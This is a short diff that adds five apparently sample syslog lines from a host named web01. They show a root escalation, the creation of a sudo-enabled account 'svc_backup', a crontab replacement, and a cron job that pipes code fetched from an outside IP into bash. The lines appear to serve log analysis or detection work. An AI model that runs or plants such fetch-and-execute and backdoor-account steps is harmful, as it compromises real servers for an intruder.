@@ -1,0 +1,5 @@
+Mar 14 21:35:58 web01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/su -
+Mar 14 21:36:28 web01 useradd[3120]: new user: name=svc_backup, UID=1004, GID=1004, home=/home/svc_backup, shell=/bin/bash
+Mar 14 21:36:28 web01 usermod[3126]: add 'svc_backup' to group 'sudo'
+Mar 14 21:37:58 web01 crontab[3140]: (admin) REPLACE (admin)
+Mar 14 21:45:58 web01 CRON[3200]: (admin) CMD (curl -s http://185.220.101.47:8080/b | bash)
